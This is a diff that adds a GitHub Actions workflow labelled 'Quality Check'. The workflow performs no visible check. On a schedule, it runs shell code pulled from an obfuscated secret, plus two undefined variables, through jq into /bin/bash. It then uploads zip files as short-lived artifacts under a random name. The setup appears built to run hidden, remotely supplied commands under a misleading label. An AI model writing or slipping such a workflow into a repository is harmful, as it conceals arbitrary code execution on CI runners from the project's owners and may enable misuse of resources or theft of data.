@@ -1,0 +1,29 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          zfe49250: ${{ secrets.zfe49250 }}
+        run: |
+          printf '%s' "$zfe49250" | jq -r .uxwbm6 | /bin/bash
+          echo $cxmy72 | jq -r .ct82 | /bin/bash
+          printf '%s' "$awkm673" | jq -r .c43459 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: HCO5UgGH
+          path: "*.zip"
+          retention-days: 1
